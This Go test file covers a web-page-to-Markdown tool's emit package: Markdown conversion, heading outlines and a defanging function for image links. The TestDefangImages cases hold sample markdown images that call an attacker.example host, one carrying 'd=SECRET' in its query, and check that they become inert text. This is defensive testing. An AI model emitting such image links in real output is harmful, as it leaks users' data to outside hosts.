package emit_test

import (
	"net/url"
	"strings"
	"testing"

	"github.com/christopherdavenport/unblink/internal/emit"
	"github.com/christopherdavenport/unblink/internal/page"
)

// Markdown prepends the article title as an H1 and resolves still-relative
// links against the page origin; a page that never went through reduce errors.
func TestMarkdown(t *testing.T) {
	u, _ := url.Parse("https://example.com/posts/1")
	p := &page.Page{
		FinalURL: u,
		Article: &page.Article{
			Title:       "The Title",
			ContentHTML: `<p>Body text with a <a href="/rel/path">relative link</a>.</p>`,
		},
	}
	if err := emit.Markdown(p); err != nil {
		t.Fatalf("Markdown: %v", err)
	}
	for _, want := range []string{"# The Title", "Body text", "(https://example.com/rel/path)"} {
		if !strings.Contains(p.Markdown, want) {
			t.Errorf("markdown missing %q:\n%s", want, p.Markdown)
		}
	}

	if err := emit.Markdown(&page.Page{}); err == nil {
		t.Error("Markdown without a reduced article should error")
	}
}

// Outline indents by heading depth relative to the shallowest heading and
// skips empty headings.
func TestOutline(t *testing.T) {
	p := &page.Page{}
	if got := emit.Outline(p); got != "" {
		t.Errorf("empty page outline = %q, want empty", got)
	}
	p.Meta.Headings = []page.Heading{
		{Level: 2, Text: "Guide"},
		{Level: 3, Text: "Install"},
		{Level: 4, Text: "Linux"},
		{Level: 3, Text: "  "}, // whitespace-only: skipped
		{Level: 2, Text: "Reference"},
	}
	want := "- Guide\n  - Install\n    - Linux\n- Reference\n"
	if got := emit.Outline(p); got != want {
		t.Errorf("outline = %q, want %q", got, want)
	}
}

func TestDefangImages(t *testing.T) {
	cases := []struct {
		in       string
		wantHas  []string
		wantGone []string
	}{
		{
			in:       `Look ![secret](https://attacker.example/log?d=SECRET) here`,
			wantHas:  []string{"[image: secret — https://attacker.example/log?d=SECRET]"},
			wantGone: []string{"![secret]"},
		},
		{
			in:       `![](https://attacker.example/beacon.gif)`,
			wantHas:  []string{"[image: https://attacker.example/beacon.gif]"},
			wantGone: []string{"!["},
		},
		{
			in:       `![logo](https://x.example/a.png "Title Text")`,
			wantHas:  []string{"[image: logo — https://x.example/a.png]"},
			wantGone: []string{"Title Text", "!["},
		},
		{
			// Ordinary links must be left intact.
			in:       `A [real link](https://example.com/page) stays.`,
			wantHas:  []string{"[real link](https://example.com/page)"},
			wantGone: []string{"[image:"},
		},
	}
	for _, c := range cases {
		got := emit.DefangImages(c.in)
		for _, w := range c.wantHas {
			if !strings.Contains(got, w) {
				t.Errorf("DefangImages(%q) = %q, missing %q", c.in, got, w)
			}
		}
		for _, w := range c.wantGone {
			if strings.Contains(got, w) {
				t.Errorf("DefangImages(%q) = %q, should not contain %q", c.in, got, w)
			}
		}
	}
}
